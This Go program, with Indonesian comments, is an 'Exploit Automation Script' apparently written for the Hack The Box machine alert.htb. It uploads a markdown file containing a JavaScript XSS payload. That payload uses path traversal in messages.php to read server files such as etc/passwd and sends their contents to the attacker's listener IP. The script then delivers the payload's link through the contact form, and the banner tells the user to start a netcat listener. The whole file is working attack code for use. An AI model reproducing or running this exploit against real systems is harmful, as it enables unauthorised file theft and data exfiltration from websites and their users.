package main

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"strings"
)

// PrintBanner menampilkan banner ke terminal
func PrintBanner() {
	fmt.Println(`
                 /\_/\
           _____/ o o \
         /~____  =Ã¸= /
        (______)__m_m)
        
       Exploit Automation Script
    --------------------------------
    Sebelum menjalankan script ini, jalankan perintah:
    sudo nc -lvnp 80
    --------------------------------
    `)
}

// CreateMultipartFormData membuat payload multipart/form-data
func CreateMultipartFormData(fieldName, fileName, content string) (*bytes.Buffer, string, error) {
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile(fieldName, fileName)
	if err != nil {
		return nil, "", err
	}

	_, err = io.WriteString(part, content)
	if err != nil {
		return nil, "", err
	}

	err = writer.Close()
	if err != nil {
		return nil, "", err
	}

	return body, writer.FormDataContentType(), nil
}

// ExtractLinkShareURL mengekstrak nilai link_share dari respons server
func ExtractLinkShareURL(responseText string) (string, error) {
	keyword := "link_share="
	startIndex := strings.Index(responseText, keyword)
	if startIndex == -1 {
		return "", fmt.Errorf("link_share parameter not found in response")
	}

	startIndex += len(keyword)
	endIndex := strings.Index(responseText[startIndex:], ".md")
	if endIndex == -1 {
		return "", fmt.Errorf("failed to locate .md in response")
	}

	// Mengambil substring yang relevan
	linkShare := responseText[startIndex : startIndex+endIndex+3] // +3 untuk ".md"
	return linkShare, nil
}

func main() {
	PrintBanner()

	baseURL := "http://alert.htb"
	uploadEndpoint := baseURL + "/visualizer.php"
	contactEndpoint := baseURL + "/contact.php"

	// Meminta input dari pengguna
	var fileName, userIP string
	fmt.Print("Masukkan nama file untuk fetch (contoh: etc/passwd): ")
	fmt.Scanln(&fileName)
	fmt.Print("Masukkan IP listener Anda: ")
	fmt.Scanln(&userIP)

	// Membuat konten markdown dinamis
	markdownContent := fmt.Sprintf(`
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../%s")
  .then(response => response.text())
  .then(data => {
    fetch("http://%s/?data=" + encodeURIComponent(data));
  })
  .catch(error => console.error("Error fetching the messages:", error));
</script>
`, fileName, userIP)

	// Membuat payload multipart/form-data
	fmt.Println("[*] Uploading markdown...")
	body, contentType, err := CreateMultipartFormData("file", "payload.md", markdownContent)
	if err != nil {
		fmt.Printf("[-] Failed to create multipart data: %s\n", err)
		os.Exit(1)
	}

	uploadResponse, err := http.Post(uploadEndpoint, contentType, body)
	if err != nil {
		fmt.Printf("[-] Failed to upload markdown: %s\n", err)
		os.Exit(1)
	}
	defer uploadResponse.Body.Close()

	if uploadResponse.StatusCode == http.StatusOK {
		fmt.Println("[+] Markdown uploaded successfully!")

		// Membaca respon dari upload
		uploadResponseBody, err := io.ReadAll(uploadResponse.Body)
		if err != nil {
			fmt.Printf("[-] Failed to read upload response: %s\n", err)
			os.Exit(1)
		}
		responseText := string(uploadResponseBody)

		// Mengekstrak URL visualizer
		linkShare, err := ExtractLinkShareURL(responseText)
		if err != nil {
			fmt.Printf("[-] %s\n", err)
			os.Exit(1)
		}

		visualizerURL := baseURL + "/visualizer.php?link_share=" + linkShare
		fmt.Printf("[+] Visualizer URL: %s\n", visualizerURL)

		// Membuat payload untuk contact.php
		email := "hackerone1337@wearehackerone.com"
		contactMessage := fmt.Sprintf(`<img src="%s" />`, visualizerURL)
		contactPayload := url.Values{
			"email":   {email},
			"message": {contactMessage},
		}

		// Mengirim pesan ke contact.php
		fmt.Println("[*] Sending message to contact.php...")
		contactResponse, err := http.PostForm(contactEndpoint, contactPayload)
		if err != nil {
			fmt.Printf("[-] Failed to send message via contact.php: %s\n", err)
			os.Exit(1)
		}
		defer contactResponse.Body.Close()

		if contactResponse.StatusCode == http.StatusOK {
			fmt.Println("[+] Message sent successfully via contact.php!")
		} else {
			fmt.Printf("[-] Failed to send message via contact.php. Status Code: %d\n", contactResponse.StatusCode)
		}
	} else {
		fmt.Printf("[-] Failed to upload markdown. Status Code: %d\n", uploadResponse.StatusCode)
	}
}

